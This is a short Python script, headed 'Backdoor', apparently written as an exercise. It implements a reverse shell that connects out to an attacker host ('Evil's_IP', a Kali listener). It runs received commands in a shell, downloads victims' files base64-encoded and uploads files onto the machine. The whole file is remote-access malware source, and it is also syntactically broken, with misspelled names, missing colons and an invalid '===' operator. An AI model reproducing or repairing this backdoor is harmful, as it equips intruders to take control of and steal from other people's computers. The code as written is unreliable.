#Backdoor

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
	def _init_(self,ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect(("destination_ip_of_kali", listenning_port))
		
	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell = True, stderr = DEVNULL, stdin = DEVNULL)

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True : 
			try : 
				json_data = json_data + self.connnection.recv(1024)
				return json.loads(json_data)
			except ValueError : 
				continue
		
	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+]] Changing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file : 
			return base64.b64encode(file.read())
	# Here we have added the reading of a file
	
	def write_file(self,path,content)
			with open(path, "wb") as file : 
				file.write(base64.b64decode(content))
				return "[+] Upload Successful. " 

	def run(self):
		command = self.reliable_recieve()
		while True :
			if command[0] === "exit":
				self.connection.close()
				sys.exit()
			elif command[0] == "cd" and len(command) > 1: 
				command_result = self.change_working_directory_to(command[1])
			elif command[0] == "download":
				command_result = self.read_file(command[1])
			elif command[0] == "upload":
				command_result = self.write_file(command[1], command[2])
			else
				command_result = self.execute_system_command(command) 
			self.reliable_send(command_result)
	
Backdoor("Evil's_IP", Listenning_Port).run()
